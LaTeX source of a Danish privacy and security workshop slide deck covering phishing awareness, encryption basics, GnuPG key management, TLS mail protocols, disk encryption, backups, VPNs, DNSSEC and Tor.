\documentclass[20pt,landscape,a4paper,footrule]{foils}
\usepackage{solido-network-slides}
%\usepackage{ulem}

% Basic things that we need are below
\selectlanguage{danish}

%\externaldocument{unix-audit-security-oevelser}
\externaldocument{\jobname-exercises}

\begin{document}

% Selvforsvar på internettet - It-sikkerhedsworkshop v/ internet samurai Henrik Lund Kramshøj

% Hvordan sikrer du din sikkerhed i dit digitale liv og undgår at miste dine data? Workshoppen gennemgår, hvad du som minimum bør gøre for at sikre dine data og dit digitale liv ved at benytte sikkerhedsfeatures i dine enheder med fokus på låse, kryptering af protokoller, kryptering af data, sikkerhedskopiering og backups.

% Husk:
% Vil du være med i en kult?

% stalking, overvågning, kæresten, spredning af private data (nøgenbilleder, egne tanker, frustrationer)

% Wifi kryptering
% Disk kryptering
% GPG/PGP
% DNScurve, Censurfri DNS, GratisDNS - shameless plug

% Tools fra
%http://cryptoparty.org/
%evt. dele af deres manifesto

% Hvis vi når det, ACTA, CleanIT, politikere arggggggg IT-Pol 


\mytitlepage
{Internet Self Defense}{Protect yourself peacefully}

\hlkprofil


\slide{Planen idag - workshop}
\vskip 2 cm


Del 1: Beskyt dig selv
\begin{list2}
\item Kl 10:00-12:30
\item Mindre foredrag mere workshop
\item Mindre enetale, mere interaktion
\end{list2}

Del 2: Hacking, Hackerværktøjer, undersøg sikkerhed
\begin{list2}
\item Kl 13:00-16:30
\item Mindre foredrag mere workshop
\item Mindre enetale, mere interaktion
\end{list2}


\centerline{Send gerne spørgsmål senere}


\slide{Formål: Hvorfor gør vi det her?}


Et demokrati fordrer borgere med frihed som har evnen til at tage beslutninger, som ikke skal være bange for overvågning.

Et demokrati fordrer borgere som aktivt vælger hvornår de afgiver personlige data om deres liv og færden.


Kryptografi er en fredelig protest mod indsamling at data som misbruges enten til kriminelle formål, kommercielle formål eller under dække af beskyttelse mod terror, ekstremisme, nazisme, misbrug af børn, ... Le mal du jour / dagens onde.

\vskip 2 cm
\centerline{\Large Du bestemmer - det er demokrati}

\vskip 1 cm
Derudover stalking, ekskærester, arbejdsgivere, forældre, ...




\slide{Rejsen starter}

Hvor skal vi nu starte denne rejse?

\hlkimage{6cm}{network-security-book-perlman9780137155880_s.jpeg}
\centerline{Private Communications in an Public World}

Anbefalelsesværdig bog som gennemgår grundlaget for kryptering, teknikker og protokollerne der bruges på internet idag, herunder: IPsec, SSL/TLS, PGP, PKI, AES m.fl.




\slide{Formål: mere specifikt}

\hlkimage{10cm}{homer-end-is-near.jpg}
\begin{list1}
\item Vores data er overalt
\item Vi er afhængige af computere Vi er afhængige af netværk
\item Vi er afhængige af andres computere - servere og services
\end{list1}


\slide{Kursusmateriale}
\label{reftest}

\hlkimage{4cm}{old_book_lumen_design_st_01.png}

\begin{list1}
\item Dette materiale består af flere dele:
\begin{list2}
%\item Introduktionsmateriale med baggrundsinformation
\item Kursusmaterialet - præsentationen til undervisning - dette sæt
\item Øvelseshæfte med øvelser
\item Hertil kommer diverse ressourcer fra internet
\end{list2}
\end{list1}

\centerline{Øvelserne er valgfrie \smiley}


\slide{Why think of security?}

\hlkimage{8cm}{1984-not-instruction-manual.jpg}


\begin{quote}
	Privacy is necessary for an open society in the electronic age. Privacy is not secrecy. A private matter is something one doesn't want the whole world to know, but a secret matter is something one doesn't want anybody to know. Privacy is the power to selectively reveal oneself to the world. ~A Cypherpunk's Manifesto by Eric Hughes, 1993
\end{quote}

Copied from \link{https://cryptoparty.org/wiki/CryptoParty}

\slide{Ånden til at hacke}

\hlkimage{4cm}{dont-panic.png}
\centerline{\color{titlecolor}\LARGE Don't Panic!}


Hacking betyder idag indbrud, kriminalitet, hærværk m.v.

Oprindeligt betød hacking at man udforskede, undersøgte, involverede sig

Vi skal bruge ånden fra hacking til forskning, udvikling

Mange regler om at man ikke må noget er imod hacking.

\vskip 1cm
\centerline{Lad være med at bryde love, men bøj gerne regler \smiley }




\slide{Hackerværktøjer}
% måske til reference afsnit?
\hlkimage{3cm}{hackers_JOLIE+1995.jpg}

\begin{list2}
\item Nmap, Nping - tester porte, godt til firewall admins \link{http://nmap.org}
\item Metasploit Framework gratis på \link{http://www.metasploit.com/}
\item Wireshark avanceret netværkssniffer - \link{http://http://www.wireshark.org/} 
%\item Paros proxy \link{http://www.parosproxy.org}
\item Burpsuite \link{http://portswigger.net/burp/}
\item Skipfish \link{http://code.google.com/p/skipfish/}
\item OpenBSD operativsystem med fokus
  på sikkerhed  \link{http://www.openbsd.org} 
\item Metasploit Pro fra \link{http://www.rapid7.com}
\end{list2}

Kilde: Angelina Jolie fra Hackers 1995

\slide{BackTrack 5 og sniffer programmer}

\hlkimage{16cm}{bt5-revolution-blogpost-BTL.png}

\begin{list1}
\item BackTrack er baseret på Linux og må kopieres frit :-)\\
\link{http://www.backtrack-linux.org/}
\item Wireshark - \link{http://www.wireshark.org} 
\end{list1}
\vskip 2cm
\centerline{Er det fornuftigt at man kan hente dem?}


\slide{Status idag på internet}

\hlkimage{21cm}{youtube-hacking-backtrack.png}


\slide{Moderne botnets}

\begin{list1}
\item Botnets spreder sig ved at inficere så mange systemer som muligt
\item Botnets idag vokser gerne langsommere - ingen ny Code Red hastighedsrekord
\item Spreder sig via SMTP, HTTP, SMB, ... alle protokoller der kan overføre data
\item Bannerkampagner og 3. parts kilder til elementer på din side?!
\item Når først der er kommet malware på systemet udvides med moduler
\end{list1}

\slide{Malware idag}

\begin{list1}
\item Malware idag er sofistikeret
\item Modulært opbygget
\item Benytter stærk kryptering til at sikre administrationen af inficerede computere
\item Benytter seneste sikkerhedshuller - 0 days til at sprede sig
\item Benytter de seneste rootkit metoder til at holde sig skjult
\item Muterer efter alle kendte metoder for at undgå opdagelse
\item Larmer mindre end tidligere
\end{list1}


\slide{Botnets og malware sælges med support}

\hlkimage{21cm}{dagens-tilbud-trojanere.pdf}

\begin{list1}
\item Malware programmører har lært kundepleje
\item "Køb denne version  og få gratis opdateringer"
\item Lej vores botnet med 100.000 computere
\end{list1}


\slide{Phishing - Receipt for Your Payment to mark561@bt....com}
\hlkimage{21cm}{paypal-phish.png}

\pause
\centerline{\bf\LARGE\color{titlecolor}Kan du selv genkende Phishing}


\slide{Zip files?}

\hlkimage{18cm}{emailvirus-zipfile.pdf}

\slide{Money!}

\hlkimage{17cm}{emailscam-banking.pdf}


\hlkimage{17cm}{emailvirus-scrfile.pdf}

\centerline{SCR er screensaver files - programmer}

\slide{Fremtiden - er success en risiko}

\begin{quote}
{\bf The Mobile Network in 2010 and 2011}\\
Global mobile data traffic grew 2.6-fold in 2010, nearly tripling for the third year in a row. The 2010 mobile data traffic growth rate was higher than anticipated. Last year's forecast projected that the growth rate would be 149 percent. This year's estimate is that global mobile data traffic grew 159 percent in 2010.\\
...\\
Last year's mobile data traffic was three times the size of the entire global Internet in 2000. Global mobile data traffic in 2010 (237 petabytes per month) was over three times greater than the total global Internet traffic in 2000 (75 petabytes per month).\\
...\\
There will be 788 million mobile-only Internet users by 2015. The mobile-only Internet population will grow 56-fold from 14 million at the end of 2010 to 788 million by the end of 2015.
\end{quote}

{\small Kilde:
\emph{Cisco Visual Networking Index: Global Mobile Data Traffic Forecast Update, 2010 - 2015}}
%\link{http://www.cisco.com/en/US/solutions/collateral/ns341/ns525/ns537/ns705/ns827/white_paper_c11-520862.html}


\slide{Håndholdte enheder}


\begin{list1}
\item Hvad kendetegner håndholdte enheder
\begin{list2}
\item små - kan typisk ligge i en lomme
\item meget lille lager til rådighed
\item Begrænset processorkapacitet
\item begrænset funktionalitet
\item kan synkroniseres med en stationær computer
\pause
\item meget stor lagerkapacitet i moderne udgaver!
\item udvidet funktionalitet
\item \emph{viewer programmer} til Word, Excel, PDF m.fl.
\item alt er forbundet idag, typisk netværk udover GPRS/telefoni
\end{list2}
\end{list1}


\slide{Gode råd til jer}

\begin{list1}
  
\item Brug teknologien 
\item Lær teknologien at kende - læs manualen!
\item Tænk på følsomheden af data I gemmer og overfører
\begin{list2}
\item Slå ting fra som I ikke bruger
\item Slå bluetooth fra når I ikke bruger den
\item Opdater softwaren på enheden
\item Slå kryptering til hvor I kan: IMAP{\bf S}, POP3{\bf S},
  HTTP{\bf S} og over bluetooth
\item Brug låsekode fremfor tastaturlås uden kode på mobiltelefonen
\item Stol ikke for meget på fingertryksaflæsere
\end{list2}

\vskip 2cm
\centerline{\large Gælder alle enheder og steder I gemmer data}

\end{list1}

\slide{Målet efter del 1}

\vskip 2cm
\hlkrightimage{7cm}{003scawebgoshindomanicon.png}
.
\begin{list1}
\item Kryptografi - brug så vidt muligt kryptering og kryptoværktøjer
\item Sikre protokoller - som ofte bruger kryptering
\item Backup - jævnligt
\vskip 1cm
\item Tal frit
\item Lær og lær fra dig
\item Følg med i nyhederne
\end{list1}


\exercise{ex:browser-install}

\exercise{ex:thunderbird}

\slide{Pause}

Er det tid til en lille pause?

\hlkimage{15cm}{300px-Fozziecurtain.JPG}
% Teknik


\slide{Kryptering step 1 - eksisterende programmer}

Vi vil nu snakke overordnet om kryptering - uden matematik \smiley

\slide{Kryptografi}

\hlkimage{18cm}{images/crypto-rot13.pdf}

\begin{list1}
\item Kryptografi er læren om, hvordan man kan kryptere data
\item Kryptografi benytter algoritmer som sammen med nøgler giver en
  ciffertekst - der kun kan læses ved hjælp af den tilhørende nøgle
\end{list1}

\slide{Public key kryptografi - 1}

\hlkimage{18cm}{images/crypto-public-key.pdf}

\begin{list1}
\item privat-nøgle kryptografi (eksempelvis AES) benyttes den samme
  nøgle til kryptering og dekryptering 
\item offentlig-nøgle kryptografi (eksempelvis RSA) benytter to
  separate nøgler til kryptering og dekryptering
\end{list1}

\slide{Public key kryptografi - 2}

\hlkimage{18cm}{images/crypto-public-key-2.pdf}

\begin{list1}
\item offentlig-nøgle kryptografi (eksempelvis RSA) bruger den private
  nøgle til at dekryptere
\item man kan ligeledes bruge offentlig-nøgle kryptografi til at
  signere dokumenter - som så verificeres med den offentlige nøgle
\end{list1}


\slide{Kryptografiske principper}

\begin{list1}
\item Algoritmerne er kendte
\item Nøglerne er hemmelige
\item Nøgler har en vis levetid - de skal skiftes ofte
\item Et successfuldt angreb på en krypto-algoritme er enhver genvej
  som kræver mindre arbejde end en gennemgang af alle nøglerne 
\item Nye algoritmer, programmer, protokoller m.v. skal gennemgås nøje!
\item Se evt. Snake Oil Warning Signs:
Encryption Software to Avoid\\ 
\link{http://www.interhack.net/people/cmcurtin/snake-oil-faq.html}
\end{list1}

\slide{Kryptering}

Formålet med kryptering

\vskip 3 cm
\centerline{\hlkbig kryptering er den eneste måde at sikre:}
\vskip 3 cm
\centerline{\hlkbig fortrolighed}
\vskip 3 cm
\centerline{\hlkbig autenticitet / integritet}




\slide{DES, Triple DES og AES}

\hlkimage{15cm}{images/AES_head.png}

\begin{list1}
\item DES kryptering baseret på den IBM udviklede Lucifer algoritme
  har været benyttet gennem mange år. 
\item Der er vedtaget en ny standard algoritme Advanced Encryption
  Standard (AES) som afløser Data Encryption Standard (DES)
\item Algoritmen hedder Rijndael og er udviklet
af Joan Daemen og Vincent Rijmen.
%\item \emph{Rijndael is available for free. You can use it for
%whatever purposes  you want, irrespective of whether
%it is accepted as AES or not.}

\item 
\link{http://en.wikipedia.org/wiki/Advanced_Encryption_Standard}\\
\link{http://csrc.nist.gov/encryption/aes/}
\end{list1}


\slide{hashing algoritmer}

\begin{quote}
NIST announced a public competition in a Federal Register Notice on November 2, 2007 to develop a new cryptographic hash algorithm called SHA-3. The competition is NIST's response to advances made in the cryptanalysis of hash algorithms.

...

Based on the public comments and internal review of the candidates, NIST announced {\bf Keccak} as the winner of the SHA-3 Cryptographic Hash Algorithm Competition on October 2, 2012, and ended the five-year competition.
\end{quote}

\link{http://csrc.nist.gov/groups/ST/hash/sha-3/index.html}

\slide{Sikre protokoller som bruger crypto}

\begin{list1}
\item Kryptering af e-mail
\begin{list2}
\item Pretty Good Privacy - Phil Zimmermann
\item PGP = mail sikkerhed
\end{list2}
\item Kryptering af sessioner SSL/TLS
\begin{list2}
\item Secure Sockets Layer SSL / Transport Layer Services TLS
\item krypterer data der sendes mellem webservere og klienter
\item SSL kan bruges generelt til mange typer sessioner, eksempelvis
  POP3S, IMAPS, SSH m.fl.
\end{list2}
\item Kryptering af netværkstrafik - Virtual Private Networks VPN
\begin{list2}
\item VPN {\color{green}IPsec IP Security Framework, se også L2TP}
\item VPN {\color{red} PPTP Point to Point Tunneling Protocol - dårlig og usikker, brug den ikke mere!}
\item SSL VPN, OpenVPN m.fl.
\end{list2}
\end{list1}

\slide{SSL og TLS}

\hlkimage{14cm}{ehandel-https.pdf}

\begin{list1}
\item Oprindeligt udviklet af Netscape Communications Inc.
\item Secure Sockets Layer SSL er idag blevet adopteret af IETF og kaldes
derfor også for Transport Layer Security TLS
TLS er baseret på SSL Version 3.0
\item RFC-2246 The TLS Protocol Version 1.0 fra Januar 1999
\end{list1}

\slide{SSL/TLS udgaver af protokoller}
\hlkimage{16cm}{imap-ssl.png}

\begin{list1}
\item Mange protokoller findes i udgaver hvor der benyttes SSL
\item HTTPS vs HTTP
\item IMAPS, POP3S, osv.
\item Bemærk: nogle protokoller benytter to porte IMAP 143/tcp vs IMAPS 993/tcp
\item Andre benytter den samme port men en kommando som starter:
\item SMTP STARTTLS RFC-3207
\end{list1}

\slide{Secure Shell - SSH og SCP}

%\begin{center}
%\colorbox{white}{\includegraphics[width=12cm]{images/tshirt-9b.jpg}}  
%\end{center}

\hlkimage{16cm}{images/openssh-banner.png}

\begin{list1}
\item Hvad er Secure Shell SSH?  
\item Oprindeligt udviklet af Tatu YlÃ¶nen i Finland,\\
se \link{http://www.ssh.com}
\item SSH afløser en række protokoller som er usikre:
  \begin{list2}
  \item Telnet til terminal adgang
  \item r* programmerne, rsh, rcp, rlogin, ...
  \item FTP med brugerid/password
  \end{list2}
\end{list1}

\slide{Postservere til klienter}

\begin{list1}
\item Når vi skal hente post sker det typisk med POP3 eller IMAP
\begin{list2}
\item POP3 Post Office Protocol version 3 RFC-1939
\item Internet Message Access Protocol (typisk IMAPv4) RFC-3501
\end{list2}
\item Forskellen mellem de to er at man typisk med POP3 henter posten, hvor man med IMAP lader den ligge på serveren
\item POP3 er bedst hvis kun en klient skal hente
\item IMAP er bedst hvis du vil tilgå din post fra flere systemer
\item Jeg bruger selv IMAPS, IMAP over SSL kryptering - idet kodeord ellers sendes i klartekst
\item SMTP bruges til at sende mail mellem servere
\end{list1}

\slide{POP3 - e-mail i Danmark}

\vskip 1 cm

\begin{list1}
\item POP3 sender brugernavn og kodeord i klartekst - ligesom FTP
\item bruges dagligt af næsten alle privatkunder
\item  alle internetudbydere og postudbydere tilbyder POP3
\item der findes en variant, POP3 over SSL/TLS
\end{list1}


\slide{POP3 i Danmark}

\hlkimage{15cm}{images/pop3-1.pdf}

\begin{list1}
\item Man har tillid til sin ISP - der administrerer såvel net som server
\end{list1}

\slide{POP3 i Danmark - trådløst}

\hlkimage{13cm}{images/pop3-wlan.pdf}
\begin{list1}
\item Har man tillid til andre ISP'er? Alle ISP'er?
\item Deler man et netværksmedium med andre?
\item {\color{green}Brug de rigtige protokoller!}
\end{list1}



\slide{POP3 og IMAP}

Brug de krypterede udgaver af protokollerne


\slide{SSL/TLS (1)}

\centerline{Istedet for POP3 brug POP3s, Istedet for IMAP brug IMAPs}

\hlkimage{8cm}{P1010053.JPG}


\slide{SSL/TLS (2)}

\centerline{SMTP kan erstattes med SMTP+TLS}

\hlkimage{8cm}{P1010054.JPG}

\exercise{ex:thunderbird}
\exercise{ex:gnupg}
\exercise{ex:enigmail}

\slide{SSL}

\begin{quote}
The 'S' in HTTPS stands for 'secure' and the security is provided by SSL/TLS. SSL/TLS is a standard network protocol which is implemented in every browser and web server to provide confidentiality and integrity for HTTPS traffic.
\end{quote}

\begin{list1}
\item Nu vi snakker om kryptering - SSL overalt?
\item Kan vi klare det på vores servere?
\pause
\item Google kan:\\
\link{http://www.imperialviolet.org/2010/06/25/overclocking-ssl.html}
\item Men alt for få gør det
\end{list1}
\pause
\centerline{Næste spørgsmål er så hvilke rod-certifikater man stoler på ...}



\slide{Kryptering step 2 - data at rest}


\slide{Tyveri - børnehaven og lufthavnen}

\begin{list1}
\item Mange glemmer at låse bilen når de skal hente børn - travlhed
\item Mange lader deres baggage være ubevogtet i lufthavnen - sult
  tørst
\item Mange lader deres bærbare stå på kontoret - frit fremme
\item Mange forlader deres bærbare på et bord under konferencer
\item ... simpelt tyveri er ofte muligt
\vskip 1 cm
\item eller er det industrispionage?
\end{list1}


\slide{Er dine data sikre}

\hlkimage{20cm}{images/data-integrity-1.pdf}

\begin{list1}
\item Stjålet laptop
\item Slettede eller ødelagte data
\item - og hvordan sletter man data? Huskede du mini SD kortet med dine private billeder?
\end{list1}

\slide{Backup}

\vskip 3cm
\centerline{\LARGE \bf Kom igang!}

\begin{list2}
\item Skriv på DVD - DVD brændere i mange laptops idag
\item Gem på netværket - Dropbox, husk en yderligere backup!
\item Brug Duplicity på egen server, eller tilsvarende services
\end{list2}

Mat Honan epic hacking :-(\\ {\small\link{http://www.wired.com/gadgetlab/2012/08/apple-amazon-mat-honan-hacking/all/}}

\slide{Duplicity}

\begin{quote}
{\large\bf What is it?}

Duplicity backs directories by producing encrypted tar-format volumes and uploading them to a remote or local file server. Because duplicity uses librsync, the incremental archives are space efficient and only record the parts of files that have changed since the last backup. Because duplicity uses {\bf GnuPG} to encrypt and/or sign these archives, they will be safe from spying and/or modification by the server.
\end{quote}

\link{http://duplicity.nongnu.org/} duplicity home page

\link{http://www.gnupg.org/} The GNU Privacy Guard

\slide{Opbevaring af passwords}

\hlkimage{10cm}{password-window.png}


\slide{harddisk beskyttelse og data kryptering}

\hlkimage{20cm}{images/apple-filevault.png}

\begin{list1}
\item Kryptering findes i alle de gængse klient operativsystemer   
\begin{list2}
\item Microsoft Windows Bitlocker - kryptering af disken Ultimate eller Enterprise
\item Apple Mac OS X - krypterer nemt med FileVault og FileVault2
\item FreeBSD GEOM og GBDE - giver mulighed for at kryptere enheder
  generelt
\item PGP disk - Pretty Good Privacy - laver en virtuel krypteret disk
\item Truecrypt \link{http://www.truecrypt.org/}
\item Nogle producenter har kodeord på disken - IBM harddisk BIOS kodeord
\end{list2}
\end{list1}

\slide{Safeguard PrivateCrypto}

\begin{list1}
\item Hvad man vælger afhænger af operativsystemet og pengepungen  
\item Tvind brugte Safeguard Easy fra det tyske firma Utimaco
\item Politiet \emph{knækkede} harddiskene ved brug af kodeord som de
  enten gættede eller fik - ikke selve krypteringen
\end{list1}

\vskip 1 cm

\begin{center}
\bf En god algoritme i et godt produkt
med en god nøgle kan ikke brydes
\end{center}

{\small\link{http://www.sophos.com/en-us/products/encryption/safeguard-privatecrypto.aspx}}


\exercise{ex:truecrypt}




\slide{Kryptering step 3 - email data in transit}

\slide{Email sikkerhed}

Selvom du kommunikerer sikkert med din mail server sendes email som postkort over internet.

En måde at beskytte data er at bruge PGP, pretty good privacy


\slide{Basale tools - PGP}

\hlkimage{5cm}{images/pgp.png}

\begin{list2}
\item Pretty Good Privacy - PGP 
\item Oprindeligt udviklet af Phil Zimmermann 
\item nu kommercielt, men der findes altid en freeware version \link{http://www.pgp.com}
\item Eksporteret fra USA på papir og scannet igen - det var lovligt 
\item I dag kan en masse information om PGP findes gennem:
\link{http://www.pgpi.org}
\end{list2}


\slide{Basale tools - GPG}

\hlkimage{5cm}{images/logo-gnupg.png}
\begin{list1}
\item Gnu Privacy Guard, forkortes GnuPG eller GPG
\item brug linket:
  \link{http://www.gnupg.org/}
\item Open Source med GPL licens. 
\item Kan bruges på alle de gængse operativsystemer
\end{list1}


\slide{GnuPG - verifikation af downloads}

\begin{alltt}
\small
$ cd /userdata/download/src/postfix/
$ ls -l *.sig 
-rw-r--r--  1 hlk  admin  152 13 Sep  2003 postfix-2.0.16.tar.gz.sig
-rw-r--r--  1 hlk  admin  152  3 May 13:34 postfix-2.1.1.tar.gz.sig
$ {\bf gpg --verify postfix-2.1.1.tar.gz.sig} 
gpg: Signature made Mon May  3 19:34:08 2004 CEST using RSA key ID D5327CB9
gpg: {\bf Good signature} from "wietse venema \verb+<wietse@porcupine.org>+"
gpg:                 aka "wietse venema <wietse@wzv.win.tue.nl>"
$
\end{alltt}

\begin{list1}
\item {\bf Det er nødvendigt at verificere arkiver med kildekode!}  
\end{list1}


\slide{Generering af keys 1}

\begin{list1}
\item Generering af key
\begin{alltt}
\$ gpg --gen-key
\end{alltt}
\begin{list2}
  \item Vælg "DSA and Elgamal"
  \item Vælg passende keysize - 4096 skader næppe
  \item Vælg passende udløbsdato - "no expire" vil virke for de fleste
  \item Brug din officielle mailaddresse i forbindelse med dit navn, så 
        Email klienter kan finde din key aytomatisk
  \item Brug en god passphrase. \\
        En lang sætning som du kan huske, og som ikke kan gættes udfra
        kendskab til dig.
  \item Når nøglen genereres, så hjælp med at generere "randomness" i systemet.
        Det får genereringen til at gå hurtigere, og det giver en bedre key.
\end{list2}

\item samme spørgsmål i GUI programmerne, {\bf og husk at lave et revoke certifikat!}
\end{list1}

\slide{Generering af keys 2}

\begin{list1}
\item Du har nu en GnuPG key klar til at blive signeret
\item Er du {\bf sikker} på at du kan huske din passphrase?
\item Når nøglen er genereret bliver der vist et kort sammendrag af 
      indholdet\\
      Dette \emph{fingerprint} kan også fås frem med:
\end{list1}

\begin{alltt}
\small
$ gpg --fingerprint addr@domain.dk
pub   1024D/D1EFBAA6 2003-01-20
      Key fingerprint = 0FAE F19D DB46 DF2E D93D  9B05 21A6 469B D1EF BAA6
uid                  Henrik Lund Kramshoej (work email) <hlk@security6.net>
uid                  Henrik Lund Kramshoej (Kramse) <hlk@kramse.dk>
uid                  [jpeg image of size 14412]
sub   2048g/6D08E6E6 2003-01-20
\end{alltt}
%$

\slide{Opsætning af defaults}

\begin{list1}
\item Vi sætter defaults der sikrer:
\begin{list2}
\item Ingen brok over usikker brug af hukommelsen (at låse sider
  kræver root, dvs. SUID på UNIX) 
\item Valg af default keyserver
\item Valg af default key (hvis du har flere)
\item Valg af karaktersæt
\end{list2}
\begin{alltt}
$ tail ~/.gnupg/gpg.conf
no-secmem-warning
keyserver hkp://pgp.mit.edu/
default-key D1EFBAA6
charset ISO-8859-1
\end{alltt}
%$
\item Det gør livet lidt lettere
\end{list1}

\slide{Upload af keys}
\begin{list1}
\item For at andre kan signere din key skal de have en kopi af din publickey.
\item Dette kan enten gøres ved at du eksporterer den til en fil 
og sender filen via Email, diskette, scp, USBkey, etc.: \\
\begin{alltt}
gpg -a --export addr@domain.dk
\end{alltt}
\item Eller det kan gøres ved at den uploades til keyserverne, hvorfra alle kan 
hente den: \\
\begin{alltt}
gpg --send-keys 47A33XXX
\end{alltt}
\end{list1}

\slide{Download af keys}
\begin{list1}
\item Download kan enten foretages via en webside med søgemuligheder \\
\link{http://pgp.mit.edu/} \\
Herfra kan en publickey gemmes i en fil, og importeres med: \\
\begin{alltt}
gpg --import FILE
\end{alltt}

\item Download kan også foretages direkte hvis keyid kendes: \\
\begin{alltt}
gpg --recv-keys DC9C7XXX
\end{alltt}
\end{list1}

\slide{Signering af keys}
\begin{list1}
\item Keys signeres med: \\
\begin{alltt}
gpg --sign-key addr@domain.dk  \# Eller keyid
\end{alltt}
\item Husk at sikre at det nu også er den korrekte key i signerer \\
      Kontroller med: \\
\begin{alltt}
gpg --fingerprint addr@domain.dk
\end{alltt}
\end{list1}

\slide{Enigmail - GPG plugin til Mail}

\hlkimage{20cm}{images/enigmail-compose}
\begin{list2}
\item Enigmail er en udvidelse til 
\item mailklienten i Mozilla/Netscape
\item standalone mailklienten Thunderbird
\item Billede fra \link{http://enigmail.mozdev.org}
\end{list2}


\slide{Enigmail - OpenGPG Key Manager}

\hlkimage{18cm}{images/enigmail-keyman1}


\centerline{Key Manager funktionaliteten i Enigmail kan anbefales}  

\slide{GPGMail plugin til Mac OS X Mail.app}

\hlkimage{20cm}{images/gpgmail-new-message.png}      

\begin{list2}
\item Bruger GPG
\item kilde:
\link{http://www.sente.ch/software/GPGMail/English.lproj/GPGMail.html}
\end{list2}

\exercise{ex:generate-pgpkey}
\exercise{ex:get-pgp-key}
\exercise{ex:email-pgp-send}
\exercise{ex:pgp-sign-key}


\slide{Kryptering step 4 - network data in transit}

\slide{Do NOT USE FTP}
\begin{list1}
\item File Transfer Protocol - filoverførsler
\item FTP bruges især til:
  \begin{list2}
    \item FTP - drivere, dokumenter, rettelser - Windows Update? er
    enten HTTP eller FTP
\item Opdatering af websites
\item Overførsel af data mellem virksomheder
\item Serveren er indbygget i de fleste serveroperativsystemer
  \end{list2}
\item FTP sender i klartekst\\ 
{\bfseries USER brugernavn} og \\
{\bfseries PASS hemmeligt-kodeord} 
\end{list1}

\slide{Grafisk Secure Copy - WinSCP}

\begin{center}
\colorbox{white}{\includegraphics[width=16cm]{images/winscp-login-advanced.png}}  
\end{center}

\begin{center}
\item screenshot fra \link{http://winscp.vse.cz/eng/screenshots/large/advanced.gif}
\end{center}

\slide{Grafisk Secure Copy - WinSCP}

\begin{center}
\colorbox{white}{\includegraphics[width=10cm]{images/winscp-explorer.png}}  
\end{center}

\begin{center}
\item benytter Secure Shell protkollen (SSH) 
\item screenshot fra
  \link{http://winscp.vse.cz/eng/screenshots/large/explorer.gif} 
\end{center}

\slide{FileZilla - understøtter SFTP}

\hlkimage{22cm}{filezilla.png}
\centerline{\link{http://filezilla-project.org/}}

\exercise{ex:filezilla}

\slide{VPN}

\begin{list1}
\item VPN \link{http://en.wikipedia.org/wiki/Virtual_private_network}
\item SSL/TLS VPN - Generelt koncept. Adskillige leverandører: Cisco, Juniper, F5 Big IP
\item De snakker ikke ret godt sammen på tværs. Brug IPSec for dette.
\item IPsec er desværre blokeret mange steder og man skal bruge en klient\\
(I praksis bruger SSL VPN ofte en klient, men den downloades fra web)
\item Open source variant: OpenVPN 
\item Der findes idag mange billige services så man kan sikre sin trafik \smiley\\
og derved kan man bruge services der kræver man bor/kommer fra USA osv.
\end{list1}


\slide{OpenVPN client}

\hlkimage{16cm}{openvpn-gui-systray.png}
\centerline{OpenVPN GUI - easy to use}



\slide{Internet sniffing by government}

\begin{list1}
\item Ægypten, Sudan, Tunesien, ...
\item Den der kontrollerer ISPerne kontrollerer trafikken
\item Facebook revolutionerne
\item Blokering er umulig, men det forsøges
\item Spredning af falsk information
\item Diginotar Dutch Certificate Authority
\end{list1}

Kilde:
{\footnotesize\link{http://irevolution.net/2011/02/10/facebook-for-repressive-regimes/}}

\slide{HTTPS Everywhere}

\hlkimage{5cm}{HTTPS_Everywhere_new_logo.jpg}
\begin{quote}
HTTPS Everywhere is a Firefox extension produced as a collaboration between The Tor Project and the Electronic Frontier Foundation. It encrypts your communications with a number of major websites.
\end{quote}

\centerline{\link{http://www.eff.org/https-everywhere}}



\slide{CertPatrol - which site uses which certificate}


\hlkimage{13cm}{certificate-patrol-400x300.jpg}

\begin{quote}
An add-on formerly considered paranoid: CertPatrol implements ''pinning'' for Firefox/Mozilla/SeaMonkey roughly as now recommended in the User Interface Guidelines of the World Wide Web Consortium (W3C).
\end{quote}

\centerline{\link{http://patrol.psyced.org/}}


\slide{Convergence - who do you trust}

\hlkimage{21cm}{convergence.png}


\centerline{\link{http://convergence.io/}}
\vskip 1cm
\centerline{Warning: radical change to how certificates work}

\slide{DANE}

\begin{quote}
Objective:

Specify mechanisms and techniques that allow Internet applications to
establish cryptographically secured communications by using information
distributed through DNSSEC for discovering and authenticating public 
keys which are associated with a service located at a domain name.
\end{quote}

DNS-based Authentication of Named Entities (dane)\\
\link{https://datatracker.ietf.org/wg/dane/charter/}\\
{\footnotesize \link{http://googleonlinesecurity.blogspot.dk/2011/04/improving-ssl-certificate-security.html}}

\vskip 2cm

\centerline{\Large DNSSEC er ved at være godt udbredt - undtagen i DK}
(findes på .dk zonen, men næsten ingen resolvere)

\slide{Censurfridns.dk uncensoredDNS}

\link{http://www.censurfridns.dk}

\begin{alltt}
Velkommen til www.censurfridns.dk. 

Du er velkommen til at benytte:

ns1.censurfridns.dk / 89.233.43.71 / 2002:d596:2a92:1:71:53::
ns2.censurfridns.dk / 89.104.194.142 / 2002:5968:c28e::53
som DNS server for at undgå DNS censur.
Se venligst \link{blog.censurfridns.dk} for mere info.
\end{alltt}

\vskip 2cm

\centerline{\Large Det er uacceptabelt at pille ved DNS - punktum!}

\slide{DNSSEC trigger}

\hlkimage{7cm}{dnssec-trigger.png}

Der findes mange DNSSEC programmer, blandt andet DNSSEC-trigger som er en navneserver til din lokale PC

\begin{list2}
\item DNSSEC Validator for firefox\\ \link{https://addons.mozilla.org/en-us/firefox/addon/dnssec-validator/}
\item OARC tools \link{https://www.dns-oarc.net/oarc/services/odvr}
\item \link{http://www.nlnetlabs.nl/projects/dnssec-trigger/}
\end{list2}



\slide{Kryptering step 5 - anonymous access to internet}

\slide{Tor project}

\hlkimage{21cm}{tor-project.png}

\centerline{\link{https://www.torproject.org/}}

Der findes alternativer, men Tor er mest kendt

\slide{Tor project - how it works 1}

\hlkimage{21cm}{how-tor-works-1.png}

\centerline{pictures from \link{https://www.torproject.org/about/overview.html.en}}

\slide{Tor project - how it works 2}

\hlkimage{21cm}{how-tor-works-2.png}

\centerline{pictures from \link{https://www.torproject.org/about/overview.html.en}}

\slide{Tor project - how it works 3}

\hlkimage{21cm}{how-tor-works-3.png}

\centerline{pictures from \link{https://www.torproject.org/about/overview.html.en}}

\slide{Tor project install}

\hlkimage{12cm}{tor-project.png}

Der findes diverse tools til Tor, Torbutton on/off knap til Firefox osv.

Det anbefales at bruge bundles fra \link{https://www.torproject.org/}

\vskip 2cm
\centerline{Pause mens dem som vil installere gør det}

\slide{Bonus: brug Bitcoins?}


\hlkimage{17cm}{bitcoinnordic.png}


